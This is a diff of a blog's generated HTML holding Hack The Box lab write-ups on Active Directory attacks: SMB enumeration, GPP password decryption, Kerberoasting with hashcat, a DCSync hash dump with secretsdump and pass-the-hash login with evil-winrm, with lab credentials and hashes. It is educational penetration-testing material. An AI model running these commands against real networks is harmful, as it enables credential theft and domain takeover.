 &lt;p&gt;At this point, I spent a while searching for simple ways to get this user property, but none worked, so I read the lab&amp;rsquo;s hint, which suggested to run &lt;a href=&#34;https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;winPEAS&lt;/a&gt;. I used specifically the PowerShell version.&lt;/p&gt;
@@ -937,7 +850,6 @@ SK&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-
 &lt;p&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Winlogon&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://en.wikipedia.org/wiki/Winlogon&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;A friend of mine also said afterwards that you could also search for Winlogon credentials with the &lt;code&gt;reg&lt;/code&gt; command:&lt;/p&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
 &lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PS C:\Users\FSmith\Documents\ComplexConfigurationStuff&amp;gt; reg query &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&amp;#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
@@ -948,8 +860,6 @@ SK&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;p&gt;&lt;img src=&#34;image-8.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;R6: svc_loanmanager&lt;/strong&gt;&lt;/p&gt;
@@ -963,7 +873,6 @@ SK&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-
 &lt;p&gt;What&amp;rsquo;s odd here is that the guided mode didn&amp;rsquo;t accept &amp;ldquo;DCSync&amp;rdquo; as a valid answer for the current question, so I just ignored it and continued the chain.&lt;/p&gt;
 &lt;p&gt;I then ran secretsdump to perform the DCSync attack and get the NTLM hashes from everyone.&lt;/p&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
 &lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ secretsdump.py -just-dc &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;svc_loanmgr:Moneymakestheworldgoround!@10.129.95.180&amp;#39;&lt;/span&gt; -outputfile &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hashes&amp;#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
@@ -974,14 +883,11 @@ SK&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;p&gt;Single quotes are needed so bash doesn&amp;rsquo;t try to interpret the exclamation mark in the password as something else.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;image-10.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Getting shell as administrator with the NT hash:&lt;/p&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
 &lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ evil-winrm -i &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;10.129.95.180&amp;#34;&lt;/span&gt; -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Administrator&amp;#34;&lt;/span&gt; -H &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;823452073d75b9d1cf70ebdf86c7f98e&amp;#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
@@ -992,8 +898,6 @@ SK&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;p&gt;&lt;img src=&#34;image-11.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;After getting the root flag, I went to take a look at the write-up to find the answers for the questions I didn&amp;rsquo;t get right.&lt;/p&gt;
@@ -1030,7 +934,6 @@ SK&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-
 &lt;h2&gt;Foothold&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;foothold&#34;&gt;&lt;/span&gt;
     &lt;a href=&#34;#foothold&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Starting with nmap:&lt;/p&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
 &lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ nmap -sCV -Pn -p- --min-rate&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt; -oN nmap/complete.nmap 10.129.1.223&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
@@ -1041,13 +944,10 @@ SK&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
-&lt;pre&gt;&lt;code&gt;# Nmap 7.94SVN scan initiated Thu Aug  1 07:54:57 2024 as: nmap -sCV -Pn -p- --min-rate=1000 -oN nmap/complete.nmap 10.129.1.223
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;# Nmap 7.94SVN scan initiated Thu Aug  1 07:54:57 2024 as: nmap -sCV -Pn -p- --min-rate=1000 -oN nmap/complete.nmap 10.129.1.223
 Increasing send delay for 10.129.1.223 from 640 to 1000 due to 55 out of 183 dropped probes since last increase.
 Warning: 10.129.1.223 giving up on port because retransmission cap hit (10).
 Nmap scan report for 10.129.1.223
@@ -1102,7 +1002,7 @@ Host script results:
 
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Thu Aug  1 07:58:14 2024 -- 1 IP address (1 host up) scanned in 196.83 seconds&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+# Nmap done at Thu Aug  1 07:58:14 2024 -- 1 IP address (1 host up) scanned in 196.83 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
     class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
     title=&#34;Copy code&#34;
@@ -1111,14 +1011,11 @@ Service detection performed. Please report any incorrect results at https://nmap
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;p&gt;From the scan, we find a lot of information about the machine, such as the version of the operating system, open ports, the domain name and also the fact that it&amp;rsquo;s running active directory and smb - which is noticeable by the 139 and 445 ports).&lt;/p&gt;
 &lt;h3&gt;Q1: How many SMB shares are shared by the target?&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;q1-how-many-smb-shares-are-shared-by-the-target&#34;&gt;&lt;/span&gt;
     &lt;a href=&#34;#q1-how-many-smb-shares-are-shared-by-the-target&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;smbclient can be used to attempt anonymous login on SMB.&lt;/p&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
 &lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ smbclient -L &lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;active.htb -I 10.129.1.223 -N&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
@@ -1129,15 +1026,12 @@ Service detection performed. Please report any incorrect results at https://nmap
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;p&gt;&lt;img src=&#34;image-1.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;R1: 7&lt;/strong&gt;&lt;/p&gt;
 &lt;h3&gt;Q2: What is the name of the share that allows anonymous read access?&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;q2-what-is-the-name-of-the-share-that-allows-anonymous-read-access&#34;&gt;&lt;/span&gt;
     &lt;a href=&#34;#q2-what-is-the-name-of-the-share-that-allows-anonymous-read-access&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Here, we can try accessing each one of the shares anonymously until one of the attempts doesn&amp;rsquo;t return an error&lt;/p&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
 &lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ smbclient &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;//10.129.1.223/&amp;lt;SHARE-NAME&amp;gt;&amp;#39;&lt;/span&gt; -U &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; -N &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
@@ -1148,8 +1042,6 @@ Service detection performed. Please report any incorrect results at https://nmap
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;p&gt;&lt;img src=&#34;image-2.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;image-3.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
@@ -1158,14 +1050,13 @@ Service detection performed. Please report any incorrect results at https://nmap
     &lt;a href=&#34;#q3-which-file-has-encrypted-account-credentials-in-it&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;After getting access to the &lt;code&gt;Replication&lt;/code&gt; share, we can navigate it searching for files. What I did was simply searching for any files, downloading them and inspecting each one of them in my own machine. Luckily, there wasn&amp;rsquo;t many of them and I eventually found the right one.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;image-4.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
-&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;utf-8&amp;#34;?&amp;gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;utf-8&amp;#34;?&amp;gt;
 &amp;lt;Groups clsid=&amp;#34;{3125E937-EB16-4b4c-9934-544FC6D24D26}&amp;#34;&amp;gt;
 	&amp;lt;User clsid=&amp;#34;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&amp;#34; name=&amp;#34;active.htb\SVC_TGS&amp;#34; image=&amp;#34;2&amp;#34; changed=&amp;#34;2018-07-18 20:46:06&amp;#34; uid=&amp;#34;{EF57DA28-5F69-4530-A59E-AAB58578219D}&amp;#34;&amp;gt;
 		&amp;lt;Properties action=&amp;#34;U&amp;#34; newName=&amp;#34;&amp;#34; fullName=&amp;#34;&amp;#34; description=&amp;#34;&amp;#34; cpassword=&amp;#34;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh&amp;#43;ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&amp;#34; changeLogon=&amp;#34;0&amp;#34; noChange=&amp;#34;1&amp;#34; neverExpires=&amp;#34;1&amp;#34; acctDisabled=&amp;#34;0&amp;#34; userName=&amp;#34;active.htb\SVC_TGS&amp;#34;/&amp;gt;
 	&amp;lt;/User&amp;gt;
-&amp;lt;/Groups&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+&amp;lt;/Groups&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
     class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
     title=&#34;Copy code&#34;
@@ -1174,8 +1065,6 @@ Service detection performed. Please report any incorrect results at https://nmap
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;p&gt;&lt;strong&gt;R3: Groups.xml&lt;/strong&gt;&lt;/p&gt;
 &lt;h3&gt;Q4: What is the decrpyted password for the SVC_TGS account?&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;q4-what-is-the-decrpyted-password-for-the-svc_tgs-account&#34;&gt;&lt;/span&gt;
@@ -1184,7 +1073,6 @@ Service detection performed. Please report any incorrect results at https://nmap
 &lt;p&gt;Eventually, I googled &amp;ldquo;groups.xml password format&amp;rdquo;, which returned a couple of results that talked about GPP, and that led me into the &lt;a href=&#34;https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#cached-gpp-pasword&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;HackTricks page&lt;/a&gt; on Windows LPE.&lt;/p&gt;
 &lt;p&gt;On the linked section, I found the explanation for the vulnerability I just described and discovered this script to decrypt the password.&lt;/p&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
 &lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ gpp-decrypt &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&amp;#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
@@ -1195,8 +1083,6 @@ Service detection performed. Please report any incorrect results at https://nmap
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;p&gt;&lt;img src=&#34;image-5.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;I found it interest to take a look at the script&amp;rsquo;s source code in order to understand the algorithm and the disclosed encryption key thing.&lt;/p&gt;
@@ -1204,7 +1090,6 @@ Service detection performed. Please report any incorrect results at https://nmap
 &lt;p&gt;&lt;strong&gt;R4: GPPstillStandingStrong2k18&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;Here, I was kinda lost while trying to get a shell. As the output of nmap had a service similar to the WinRM one from the previous machines, running on port &lt;code&gt;47001&lt;/code&gt;, I kept trying to connect with evil-winrm for a long time, always getting the same error and wondering if I was doing something wrong. I then decided to take a peek at the write-up. At the point where I was, it said that we could use our acquired credentials to keep enumerating SMB, and suggested to run smbmap. This hint was enough to get back into doing some progress.&lt;/p&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
 &lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ smbmap -r -g smbmap.out -H 10.129.1.223 -u SVC_TGS -p GPPstillStandingStrong2k18&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
@@ -1215,14 +1100,11 @@ Service detection performed. Please report any incorrect results at https://nmap
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;p&gt;&lt;img src=&#34;image-6.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Although it didn&amp;rsquo;t show any information that I thought to be useful to do what I wanted, I realized that I could simply use the &lt;code&gt;SVC-TGS&lt;/code&gt; user to try looking into the other shares, specifically the ones that I now know that I have access to.&lt;/p&gt;
 &lt;p&gt;So I went back to &lt;code&gt;smbclient&lt;/code&gt;:&lt;/p&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
 &lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ smbclient &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;//10.129.1.223/Users&amp;#39;&lt;/span&gt; -U &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;SVC_TGS&amp;#34;&lt;/span&gt; --password&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;GPPstillStandingStrong2k18&amp;#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
@@ -1233,8 +1115,6 @@ Service detection performed. Please report any incorrect results at https://nmap
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;p&gt;At this point I realized that the &lt;code&gt;Users&lt;/code&gt; share was simply the &lt;code&gt;Users&lt;/code&gt; directory from Windows. The SMB shell is just more limited.&lt;/p&gt;
 &lt;h2&gt;Privilege escalation&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;privilege-escalation&#34;&gt;&lt;/span&gt;
@@ -1244,7 +1124,6 @@ Service detection performed. Please report any incorrect results at https://nmap
 &lt;p&gt;I then searched information about the Kerberoast attack and got to the &lt;a href=&#34;https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast#linux&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;HackTricks page&lt;/a&gt;.&lt;/p&gt;
 &lt;p&gt;Found out that there is an impacket script to perform it, called GetUserSPNs.py.&lt;/p&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
 &lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ GetUserSPNs.py -request -dc-ip 10.129.1.223 active.htb/SVC_TGS -outputfile hashes.kerberoast&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
@@ -1255,14 +1134,11 @@ Service detection performed. Please report any incorrect results at https://nmap
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;p&gt;&lt;img src=&#34;image-7.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;h3&gt;Q6: What is the plaintext password for the administrator account?&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;q6-what-is-the-plaintext-password-for-the-administrator-account&#34;&gt;&lt;/span&gt;
     &lt;a href=&#34;#q6-what-is-the-plaintext-password-for-the-administrator-account&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Cracking the hash with hashcat:&lt;/p&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
 &lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ hashcat -a &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; hashes.kerberoast /usr/share/wordlists/rockyou.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
@@ -1273,8 +1149,6 @@ Service detection performed. Please report any incorrect results at https://nmap
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
